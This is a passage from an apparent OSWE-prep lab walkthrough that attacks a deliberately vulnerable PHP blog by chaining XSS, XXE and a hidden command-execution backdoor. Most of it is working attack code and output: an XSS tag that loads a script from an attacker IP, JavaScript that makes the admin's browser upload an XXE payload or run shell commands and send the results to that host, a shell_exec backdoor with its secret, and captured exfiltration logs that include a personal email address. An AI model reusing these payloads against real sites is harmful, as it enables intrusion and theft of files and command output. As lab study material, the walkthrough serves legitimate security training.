Comment:PD9waHANCmluY2x1ZGUoImlzQWRtaW4ucGhwIik7DQppbmNsdWRlKCJoZWFkZXIucGhwIik7DQo/PiA8IS0tIGNvbnRhaW5zIHRoZSBoZWFkZXIucGhwICsgaXNBZG1pbi5waHAgY29kZSAoY2xlYW5lciBjb2RlKSAtLT4NCg0KICAgICAgICA8IS0tIFBhZ2UgY29udGVudC0tPg0KICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIgbXQtNSI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy04Ij4NCiAgICAgICAgICAgICAgICAgICAgPCEtLSBQb3N0IGNvbnRlbnQtLT4NCiAgICAgICAgICAgICAgICAgICAgPGFydGljbGU+DQogICAgICAgICAgICAgICAgICAgICAgICA8IS0tIFBvc3QgaGVhZGVyLS0+DQogICAgICAgICAgICAgICAgICAgICAgICA8aGVhZGVyIGNsYXNzPSJtYi00Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8IS0tIFBvc3QgdGl0bGUtLT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDEgY2xhc3M9ImZ3LWJvbGRlciBtYi0xIj5XZWxjb21lIHRvIFNlY0F1cmEncyBCbG9nISAoT1NXRSBQUkVQKTwvaDE+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPCEtLSBQb3N0IG1ldGEgY29udGVudC0tPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRleHQtbXV0ZWQgZnN0LWl0YWxpYyBtYi0yIj5MaWtlIGFuZCBTdWJzY3JpYmUhPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPCEtLSBQb3N0IGNhdGVnb3JpZXMtLT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iYmFkZ2UgYmctc2Vjb25kYXJ5IHRleHQtZGVjb3JhdGlvbi1ub25lIGxpbmstbGlnaHQiIGhyZWY9IiMhIj5XZWIgRGVzaWduPC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJiYWRnZSBiZy1zZWNvbmRhcnkgdGV4dC1kZWNvcmF0aW9uLW5vbmUgbGluay1saWdodCIgaHJlZj0iIyEiPkZyZWViaWVzPC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9oZWFkZXI+DQogICAgICAgICAgICAgICAgICAgICAgICA8IS0tIFByZXZpZXcgaW1hZ2UgZmlndXJlLS0+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZmlndXJlIGNsYXNzPSJtYi00Ij48aW1nIGNsYXNzPSJpbWctZmx1aWQgcm91bmRlZCIgc3JjPSJiYW5uZXIuUE5HIiBhbHQ9Ii4uLiIgLz48L2ZpZ3VyZT4NCiAgICAgICAgICAgICAgICAgICAgPC9hcnRpY2xlPg0KICAgICAgICAgICAgICAgICAgICA8IS0tIENvbW1lbnRzIHNlY3Rpb24tLT4NCiAgICAgICAgICAgICAgICAgICAgPHNlY3Rpb24gY2xhc3M9Im1iLTUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBiZy1saWdodCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGgxPlVwbG9hZCBjb21tZW50IHRvIHBhZ2UgPC9oMT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDQ+PGk+KHN0aWxsIG5lZWQgdG8gYWRkIE1ZU1FMIGJhY2tlbmQpPC9pPjwvaDQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwhLS0gQ29tbWVudCBmb3JtLS0+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0idXBsb2FkLnBocCIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlbGVjdCBpbWFnZSB0byB1cGxvYWQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgY2xhc3M9ImZvcm0tY29udHJvbCIgdHlwZT0iZmlsZSIgbmFtZT0iY29tbWVudHMiIGlkPSJjb21tZW50cyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgY2xhc3M9ImZvcm0tY29udHJvbCBidG4tcHJpbWFyeSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsb2FkIEltYWdlIiBuYW1lPSJzdWJtaXQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9mb3JtPg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxoMz5BY2NlcHRhYmxlIFhNTCBjb2RlIGxvb2tzIGxpa2U8L2gzPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8eG1wID4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGNvbW1lbnRzPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG5hbWU+U2VjQXVyYTwvbmFtZT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxjb21tZW50PlBsZWFzZSBTdWJzY3JpYmU8L2NvbW1lbnQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvY29tbWVudHM+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwveG1wID4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHANCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzc2V0KCRfRklMRVNbImNvbW1lbnRzIl0pICYmICRfRklMRVNbJ2NvbW1lbnRzJ11bJ3NpemUnXSA+IDAgJiYgJF9GSUxFU1snY29tbWVudHMnXVsnZXJyb3InXSA9PSAwKXsNCg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkeG1sZmlsZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRfRklMRVNbImNvbW1lbnRzIl1bJ3RtcF9uYW1lJ10pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRvbSA9IG5ldyBET01Eb2N1bWVudCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRvbS0+bG9hZFhNTCgkeG1sZmlsZSwgTElCWE1MX05PRU5UIHwgTElCWE1MX0RURExPQUQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1lbnRzID0gc2ltcGxleG1sX2ltcG9ydF9kb20oJGRvbSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbmFtZSA9ICRjb21tZW50cy0+bmFtZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb21tZW50ID0gJGNvbW1lbnRzLT5jb21tZW50OyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIk5hbWU6ICIuICRuYW1lIC4gIjxicj5Db21tZW50OiIgLiAkY29tbWVudDsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfWVsc2V7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAidXBsb2FkIGVycm9yIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL1NvbWUgZnVuY3Rpb25hbGl0eSB0aGF0IGlzbnQga25vd24gdG8gdGhlIHVzZXINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpc3NldCgkX1JFUVVFU1RbJ2RlYnVnY29tbWFuZExpbmVQYXJhbWV0ZXInXSkgJiYgJF9SRVFVRVNUWydkZWJ1Z2NvbW1hbmRTZWNyZXQnXSA9PSAiU3Vic2NyaWJlMlNlY0F1cmE6KSIpew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8iPGJyPjxwcmU+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydkZWJ1Z2NvbW1hbmRMaW5lUGFyYW1ldGVyJ10pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjwvcHJlPiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L3NlY3Rpb24+DQogICAgICAgICAgICAgICAgPC9kaXY+DQoNCg0KDQo8P3BocCBpbmNsdWRlKCJmb290ZXIucGhwIik7Pz48IS0tIGNvbnRhaW5zIHRoZSBmb290ZXIucGhwIGNvZGUgKGNsZWFuZXIgY29kZSkgLS0+DQo= 
```

✅ **File system read access confirmed via XXE**



## Phase 3: Chaining XSS + XXE for Advanced Exploitation

### Automated XXE via XSS

To automate the XXE exploitation through XSS, I developed a JavaScript payload that:

1. Uses admin browser context to upload malicious XML
2. Retrieves XXE response containing file contents
3. Exfiltrates data to attacker server

#### Advanced XSS Payload

**XSS Trigger**:
```javascript
"><script src=http://192.168.32.133:1337/xxe.js></script>
```

**XXE Automation Script** (`xxe.js`):
```javascript
// this is xxe.js. XSS Payload: "><script src=http://192.168.32.133/xxe.js></script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http:\/\/localhost\/secaura\/upload.php", true); // check the path might be /secaura or /blog (depends on your setup)
xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=-WebKitFormBoundaryIWVuNqKqQF7AtNDv");
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function() {
    if(this.readyState === 4) {
        console.log(this.responseText);
        
        // Extract the base64 encoded content from the response
        // You might need to adjust this parsing based on your actual response format
        var response = this.responseText;
        
        // Exfiltrate the response
        fetch("http://192.168.32.133:1337/content?url=" + encodeURIComponent("xxe") + "&content=" + encodeURIComponent(response), { // change IP and port 
            method: "GET",
            mode: "no-cors" // This bypasses CORS but you won't get a response
        }).catch(function(error) {
            console.log("Fetch error (expected with no-cors):", error);
        });
    }
});

var body = "WebKitFormBoundaryIWVuNqKqQF7AtNDv\r\n" + 
  "Content-Disposition: form-data; name=\"comments\"; filename=\"test.xml\"\r\n" + 
  "Content-Type: text/xml\r\n" + 
  "\r\n" + 
  "\x3c?xml version=\"1.0\" encoding=\"UTF-8\"?\x3e\r\n" + 
  "\x3c!DOCTYPE xxeFileRead [\x3c!ENTITY file SYSTEM \"php://filter/convert.base64-encode/resource=upload.php\"\x3e]\x3e\r\n" + 
  "\x3ccomments\x3e\r\n" + 
  "    \x3cname\x3eSoliman\x3c/name\x3e\r\n" + 
  "    \x3ccomment\x3e&file;\x3c/comment\x3e\r\n" + 
  "\x3c/comments\x3e\r\n" + 
  "WebKitFormBoundaryIWVuNqKqQF7AtNDv\r\n" + 
  "Content-Disposition: form-data; name=\"submit\"\r\n" + 
  "\r\n" + 
  "Upload Image\r\n" + 
  "WebKitFormBoundaryIWVuNqKqQF7AtNDv--\r\n";

var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); 

xhr.send(new Blob([aBody]));
```

**Python Automation Script:** [xxe_xss_listener.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/SecAura%20Blog/xxe_xss_listener.py) 

## Phase 4: Hidden Remote Debugging Functionality Discovery

### Critical Vulnerability in `upload.php`

After Base64 decoding the exfiltrated `upload.php` file, I discovered a hidden debug functionality:

```php
...
//Some functionality that isnt known to the user
if (isset($_REQUEST['debugcommandLineParameter']) && $_REQUEST['debugcommandSecret'] == "Subscribe2SecAura:)"){
    echo"<br><pre>";
    echo shell_exec($_REQUEST['debugcommandLineParameter']);
    echo "</pre>";
}
...
```

### RCE Verification (Requires Admin Access)

**Direct Command Execution**:
```
/secaura/upload.php?debugcommandLineParameter=id&debugcommandSecret=Subscribe2SecAura:)
```

**Result**:
```
uid=197609(someuser) gid=197609(someuser) groups=197609(someuser),401408(Medium Mandatory Level),197611(docker-users),578(Hyper-V Administrators),545(Users),4(INTERACTIVE),66049(CONSOLE LOGON),11(Authenticated Users),15(This Organization),68542(MicrosoftAccount+someuser@gmail.com),113(Local account),4095(CurrentSession),66048(LOCAL),262180(Cloud Account Authentication)
```

✅ **User with admin access (came from localhost) Can Execute Commands**

## Phase 5: XSS Remote Code Execution 
As known only the admin can access the endpoint `/secaura/upload.php`, this means that the attacker himself doesnot have the ability to interact with `upload.php` to execute system level commands. However, we can make use our XSS to make the admin's broswer request the endpoint for us executing arbitrary system level commands.

### XSS Interact with the Code Execution Endpoint
**XSS RCE automation script:**
```javascript
// XSS Payload: "><script src=http://192.168.32.133/xxe.js></script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http:\/\/localhost\/secaura\/upload.php?debugcommandLineParameter=id&debugcommandSecret=Subscribe2SecAura:)", true); // check the path might be /secaura or /blog (depends on your setup)
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function() {
    if(this.readyState === 4) {
        console.log(this.responseText);
        
        // Extract the base64 encoded content from the response
        // You might need to adjust this parsing based on your actual response format
        var response = this.responseText;
        
        // Exfiltrate the response
        fetch("http://192.168.32.133/content?url=" + encodeURIComponent("rce") + "&content=" + encodeURIComponent(response), { // change IP and port 
            method: "GET",
            mode: "no-cors" // This bypasses CORS but you won't get a response
        }).catch(function(error) {
            console.log("Fetch error (expected with no-cors):", error);
        });
    }
});

xhr.send();
```

Response received:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.32.1 - - [12/Sep/2025 12:35:58] "GET /xss_admin_pages.js HTTP/1.1" 200 -
192.168.32.1 - - [12/Sep/2025 12:35:58] code 404, message File not found
192.168.32.1 - - [12/Sep/2025 12:35:58] "GET /content?url=rce&content=%3C!DOCTYPE%20html%3E%0D%0A%3Chtml%20lang%3D%22en%22%3E%0D%0A%20%20%20%20%3Chead%3E%0D%0A%20%20%20%20%20%20%20%20%3Cmeta%20charset%3D%22utf-8%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%2C%20shrink-to-fit%3Dno%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%3Cmeta%20name%3D%22description%22%20content%3D%22%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%3Cmeta%20name%3D%22author%22%20content%3D%22%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%3Ctitle%3ESecAura%27s%20Blog!%20(OSWE%20PREP)%3C%2Ftitle%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Favicon--%3E%0D%0A%20%20%20%20%20%20%20%20%3Clink%20rel%3D%22icon%22%20type%3D%22image%2Fx-icon%22%20href%3D%22assets%2Ffavicon.ico%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Core%20theme%20CSS%20(includes%20Bootstrap)--%3E%0D%0A%20%20%20%20%20%20%20%20%3Clink%20href%3D%22css%2Fstyles.css%22%20rel%3D%22stylesheet%22%20%2F%3E%0D%0A%20%20%20%20%3C%2Fhead%3E%0D%0A%20%20%20%20%3Cbody%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Responsive%20navbar--%3E%0D%0A%20%20%20%20%20%20%20%20%3Cnav%20class%3D%22navbar%20navbar-expand-lg%20navbar-dark%20bg-dark%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22navbar-brand%22%20href%3D%22%23!%22%3ESecAura%27s%20Blog!%20(OSWE%20PREP)%3C%2Fa%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22navbar-toggler%22%20type%3D%22button%22%20data-bs-toggle%3D%22collapse%22%20data-bs-target%3D%22%23navbarSupportedContent%22%20aria-controls%3D%22navbarSupportedContent%22%20aria-expanded%3D%22false%22%20aria-label%3D%22Toggle%20navigation%22%3E%3Cspan%20class%3D%22navbar-toggler-icon%22%3E%3C%2Fspan%3E%3C%2Fbutton%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22collapse%20navbar-collapse%22%20id%3D%22navbarSupportedContent%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22navbar-nav%20ms-auto%20mb-2%20mb-lg-0%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%20class%3D%22nav-item%22%3E%3Ca%20class%3D%22nav-link%20active%22%20aria-current%3D%22page%22%20href%3D%22index.php%22%3EBlog%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%20class%3D%22nav-item%22%3E%3Ca%20class%3D%22nav-link%22%20href%3D%22admin.php%22%3EAdmin%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ful%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2Fnav%3E%20%3C!--%20contains%20the%20header.php%20%2B%20isAdmin.php%20code%20(cleaner%20code)%20--%3E%0D%0A%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Page%20content--%3E%0D%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%20mt-5%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22row%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-lg-8%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Post%20content--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Carticle%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Post%20header--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cheader%20class%3D%22mb-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Post%20title--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%22fw-bolder%20mb-1%22%3EWelcome%20to%20SecAura%27s%20Blog!%20(OSWE%20PREP)%3C%2Fh1%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Post%20meta%20content--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22text-muted%20fst-italic%20mb-2%22%3ELike%20and%20Subscribe!%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Post%20categories--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22badge%20bg-secondary%20text-decoration-none%20link-light%22%20href%3D%22%23!%22%3EWeb%20Design%3C%2Fa%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22badge%20bg-secondary%20text-decoration-none%20link-light%22%20href%3D%22%23!%22%3EFreebies%3C%2Fa%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fheader%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Preview%20image%20figure--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfigure%20class%3D%22mb-4%22%3E%3Cimg%20class%3D%22img-fluid%20rounded%22%20src%3D%22banner.PNG%22%20alt%3D%22...%22%20%2F%3E%3C%2Ffigure%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Farticle%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Comments%20section--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csection%20class%3D%22mb-5%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card%20bg-light%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-body%22%3E%0D%0A%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%3EUpload%20comment%20to%20page%20%3C%2Fh1%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch4%3E%3Ci%3E(still%20need%20to%20add%20MYSQL%20backend)%3C%2Fi%3E%3C%2Fh4%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Comment%20form--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action%3D%22upload.php%22%20method%3D%22post%22%20enctype%3D%22multipart%2Fform-data%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Select%20image%20to%20upload%3A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20class%3D%22form-control%22%20type%3D%22file%22%20name%3D%22comments%22%20id%3D%22comments%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20class%3D%22form-control%20btn-primary%22%20type%3D%22submit%22%20value%3D%22Upload%20Image%22%20name%3D%22submit%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch3%3EAcceptable%20XML%20code%20looks%20like%3C%2Fh3%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cxmp%20%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ccomments%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cname%3ESecAura%3C%2Fname%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ccomment%3EPlease%20Subscribe%3C%2Fcomment%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fcomments%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fxmp%20%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20upload%20error%3Cbr%3E%3Cpre%3Euid%3D197609(moham)%20gid%3D197609(moham)%20groups%3D197609(moham)%2C401408(Medium%20Mandatory%20Level)%2C197611(docker-users)%2C578(Hyper-V%20Administrators)%2C545(Users)%2C4(INTERACTIVE)%2C66049(CONSOLE%20LOGON)%2C11(Authenticated%20Users)%2C15(This%20Organization)%2C68542(MicrosoftAccount%2Bmohamedeljoker661%40gmail.com)%2C113(Local%20account)%2C4095(CurrentSession)%2C66048(LOCAL)%2C262180(Cloud%20Account%20Authentication)%0A%3C%2Fpre%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsection%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%0D%0A%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Side%20widgets--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-lg-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Search%20widget--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20%3Cdiv%20class%3D%22card%20mb-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-header%22%3ESearch%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-body%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22input-group%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20class%3D%22form-control%22%20type%3D%22text%22%20placeholder%3D%22Enter%20search%20term...%22%20aria-label%3D%22Enter%20search%20term...%22%20aria-describedby%3D%22button-search%22%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22btn%20btn-primary%22%20id%3D%22button-search%22%20type%3D%22button%22%3EGo!%3C%2Fbutton%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%20--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20